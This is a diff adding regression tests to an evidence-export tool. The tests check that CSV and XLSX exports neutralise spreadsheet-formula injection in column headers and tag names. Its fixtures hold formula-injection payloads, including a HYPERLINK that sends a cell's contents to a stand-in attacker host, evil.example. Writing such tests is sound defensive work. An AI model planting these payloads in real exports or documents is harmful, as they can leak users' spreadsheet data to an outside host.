@@ -95,3 +95,44 @@ def test_csv_export_includes_derived_columns(store, write_csv):
     lines = text.strip().splitlines()
     assert lines[0].endswith(",Host")
     assert lines[1].endswith(",a.example") and lines[2].endswith(",b.example")
+
+
+FORMULA_HEADER = '=HYPERLINK("http://evil.example/?"&A2,"click")'
+FORMULA_TAG = '=HYPERLINK("http://evil.example","open")'
+
+
+def _formula_case(store, write_csv):
+    path = write_csv([[FORMULA_HEADER, "@SUM(1+1)", "plain"], ["a", "b", "c"], ["d", "e", "f"]],
+                     name="hdr.csv")
+    sid = store.ingest_csv(path, name="hdr.csv", build_fts=False)["id"]
+    tag = store.upsert_tag(None, FORMULA_TAG, "#ff0000", None)
+    store.set_tags(sid, [1], tag["id"], True)
+    return sid
+
+
+def test_csv_export_neutralises_formula_column_and_tag_names(store, write_csv):
+    """Column names are header text from the evidence file and tag names
+    arrive in adopted sessions; both went into the CSV raw while every cell
+    beside them was prefixed. Both the virtual (unfiltered) and the
+    materialised (sorted) export paths."""
+    sid = _formula_case(store, write_csv)
+    for spec in ({"filters": [], "sort": []},
+                 {"filters": [], "sort": [{"column": "plain", "dir": "desc"}]}):
+        view = store.build_view(sid, {"source_id": sid, **spec})
+        rows = list(csv.reader(io.StringIO(_export_csv_text(store, view["view_id"]))))
+        assert rows[0][3:] == ["'" + FORMULA_HEADER, "'@SUM(1+1)", "plain"]
+        tagged = next(r for r in rows[1:] if r[0] == "1")
+        assert tagged[1] == "'" + FORMULA_TAG
+
+
+def test_xlsx_exports_never_write_a_header_as_a_formula(store, write_csv, tmp_path):
+    """openpyxl writes any string starting with '=' as a FORMULA — an
+    attacker-named column became a live HYPERLINK in the hand-over
+    workbook's header row."""
+    _formula_case(store, write_csv)
+    path = tmp_path / "all.xlsx"
+    store.export_all_xlsx(str(path))
+    for wb in (load_workbook(store.export_tagged_xlsx()), load_workbook(str(path))):
+        header = list(wb.worksheets[0][1])
+        assert all(c.data_type != "f" for c in header)
+        assert [c.value for c in header[3:]] == ["'" + FORMULA_HEADER, "'@SUM(1+1)", "plain"]
